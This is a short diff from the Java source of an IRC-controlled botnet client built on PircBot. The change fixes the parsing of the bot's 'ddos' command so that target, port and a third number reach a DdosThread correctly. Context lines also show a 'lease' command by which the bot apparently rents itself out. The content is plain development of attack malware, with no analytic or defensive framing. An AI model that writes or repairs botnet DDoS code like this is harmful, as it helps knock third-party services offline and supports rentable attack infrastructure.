@@ -50,10 +50,10 @@ public class BotnetClient extends PircBot {
 		} else if (message.toLowerCase().startsWith("ddos")) {
 			System.out.println(sender + ": " + message);
 			String[] parts = message.split(" ");
-			if (parts.length < 3) {
+			if (parts.length < 4) {
 				System.out.println("Bad ddos message provided");
 			} else {
-				DdosThread ddos = new DdosThread(parts[0], Integer.parseInt(parts[1]), Integer.parseInt(parts[2]));
+				DdosThread ddos = new DdosThread(parts[1], Integer.parseInt(parts[2]), Integer.parseInt(parts[3]));
 			}
 		} else if (message.toLowerCase().startsWith("lease")) {
 			System.out.println("Leasing Myself");
